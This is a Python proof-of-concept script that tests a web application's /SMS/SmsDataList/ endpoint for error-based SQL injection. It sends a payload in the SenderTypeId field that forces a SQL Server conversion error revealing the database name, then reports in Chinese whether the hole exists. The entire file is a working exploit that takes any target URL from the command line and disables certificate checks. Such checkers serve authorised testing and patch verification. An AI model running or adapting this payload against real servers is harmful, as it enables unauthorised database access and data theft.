#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

def verify(site):
    path ="/SMS/SmsDataList/?pageIndex=1&pageSize=1"
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    payload ="Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0' and 1=convert(int,sys.fn_sqlvarbasetostr(db_name()))--"
    try:
        resq  = requests.post(url=site+path,headers=headers,data=payload,timeout=5,verify=False,allow_redirects=False)
        #print(resq.text)
        if resq.status_code == 200 and "nvarchar" in resq.text:
            info = re.findall("'N'([^']+)'", resq.text)
            if len(info) != 0:
                return info[0]
    except Exception as e:
        print(sys.exc_info())
        pass
    return ""
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，执行payload convert(int,sys.fn_sqlvarbasetostr(db_name())) 结果为：", info)
    else:
        print("[-]漏洞不存在")
